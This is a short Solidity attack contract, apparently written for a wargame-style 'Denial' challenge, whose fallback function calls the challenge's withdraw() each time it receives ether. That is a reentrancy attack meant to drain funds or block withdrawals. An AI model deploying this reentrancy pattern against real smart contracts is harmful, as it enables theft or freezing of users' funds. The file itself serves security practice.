pragma solidity ^0.7.3;
/**
* Attack contract boilerplate template. 
* Useful to create an attack contract for a new challenge without accidentally
* peaking at the solution.
*/

interface IDenialChallenge {
    function withdraw() external;
}

contract DenialAttacker {
    IDenialChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = IDenialChallenge(challengeAddress);
    }

    fallback() external payable {
        // Trigger a reentrancy attack.
        challenge.withdraw();
    }
}
